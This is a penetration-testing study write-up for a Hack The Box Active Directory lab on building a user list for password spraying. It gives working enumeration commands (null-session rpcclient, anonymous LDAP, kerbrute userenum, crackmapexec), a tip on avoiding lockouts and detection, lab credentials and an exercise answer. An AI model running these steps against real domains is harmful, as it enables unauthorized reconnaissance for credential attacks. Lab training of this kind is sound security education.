### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: Password Spraying: Making a Target User List <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Password Spraying: Making a Target User List

Source the user list from one of:
- SMB NULL session → full domain user dump
- LDAP anonymous bind → full domain user dump
- Kerbrute userenum against a known wordlist (`statistically-likely-usernames`, `linkedin2username`)
- Credentialed enum (any valid AD account)

Always log: targeted accounts, DC used, timestamp, password tried: both for deduping and for crosscheck if accounts lock.

<br>

---

<br>

### SMB NULL Session to Pull User List

`enum4linux` users (filter to flat list):

```diff
+ $ enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

<br>

`rpcclient`:

```diff
+ $ rpcclient -U "" -N 172.16.5.5
+ rpcclient $> enumdomusers
```

<br>

`CrackMapExec` with `--users` shows `badpwdcount` so you can skip near-lockout accounts:

```diff
+ $ crackmapexec smb 172.16.5.5 --users
```

<br>

---

<br>

### LDAP Anonymous Users

`ldapsearch` filtered:

```diff
+ $ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

<br>

`windapsearch`:

```diff
+ $ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

<br>

---

<br>

### Kerbrute User Enumeration

Kerberos pre-auth = no Win event 4625, no lockout for username probes (only `4768` if Kerberos logging on):

```diff
+ $ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

<br>

---

<br>

### Credentialed User Enum

```diff
+ $ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

<br>

---

<br>

### Password Spraying Target User List Exercise

IP: 10.129.246.253

SSH `htb-student:HTB_@cademy_stdnt!`.

---

### Question 1:
Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?

#### SSH in, run Kerbrute userenum against the DC.

```diff
+ $ ssh htb-student@10.129.246.253
+ $ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

	2025/12/09 02:11:58 >  Done! Tested 48705 usernames (56 valid) in 10.390 seconds

&#x1F6A9; found **56**.
